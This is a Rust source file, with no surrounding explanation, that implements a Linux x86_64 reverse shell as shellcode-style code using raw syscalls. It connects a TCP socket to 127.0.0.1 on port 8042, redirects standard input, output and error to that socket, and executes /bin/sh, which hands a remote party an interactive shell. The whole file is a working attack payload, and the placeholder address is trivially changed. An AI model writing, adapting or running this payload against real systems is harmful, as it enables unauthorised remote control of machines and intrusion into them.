#![no_std]
#![no_main]
#![feature(asm)]

#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}

const PORT: u16 = 0x6A1F; // 8042
const IP: u32 = 0x0100007f; // 127.0.0.1

const SYS_DUP2: u64 = 33;
const SYS_SOCKET: u64 = 41;
const SYS_CONNECT: u64 = 42;
const SYS_EXECVE: u64 = 59;

const AF_INET: u64 = 2;
const SOCK_STREAM: u64 = 1;
const IPPROTO_IP: u64 = 0;

const STDIN: u64 = 0;
const STDOUT: u64 = 1;
const STDERR: u64 = 2;

#[repr(C)]
struct sockaddr_in {
    sin_family: u16,
    sin_port: u16,
    sin_addr: in_addr,
    sin_zero: [u8; 8],
}

#[repr(C)]
struct in_addr {
    s_addr: u32,
}

unsafe fn syscall2(syscall: u64, arg1: u64, arg2: u64) -> u64 {
    let ret: u64;
    asm!(
        "syscall",
        in("rax") syscall,
        in("rdi") arg1,
        in("rsi") arg2,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
        options(nostack),
    );
    ret
}

unsafe fn syscall3(syscall: u64, arg1: u64, arg2: u64, arg3: u64) -> u64 {
    let ret: u64;
    asm!(
        "syscall",
        in("rax") syscall,
        in("rdi") arg1,
        in("rsi") arg2,
        in("rdx") arg3,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
        options(nostack),
    );
    ret
}

#[no_mangle]
fn _start() -> ! {
    let shell: &str = "/bin/sh\x00";
    let argv: [*const &str; 2] = [&shell, core::ptr::null()];
    let socket_addr = sockaddr_in {
        sin_family: AF_INET as u16,
        sin_port: PORT,
        sin_addr: in_addr { s_addr: IP },
        sin_zero: Default::default(),
    };
    let socket_addr_len = core::mem::size_of::<sockaddr_in>();

    unsafe {
        let socket_fd = syscall3(SYS_SOCKET, AF_INET, SOCK_STREAM, IPPROTO_IP);
        syscall3(
            SYS_CONNECT,
            socket_fd,
            &socket_addr as *const sockaddr_in as u64,
            socket_addr_len as u64,
        );

        syscall2(SYS_DUP2, socket_fd, STDIN);
        syscall2(SYS_DUP2, socket_fd, STDOUT);
        syscall2(SYS_DUP2, socket_fd, STDERR);

        syscall3(SYS_EXECVE, shell.as_ptr() as u64, argv.as_ptr() as u64, 0);
    };

    loop {}
}
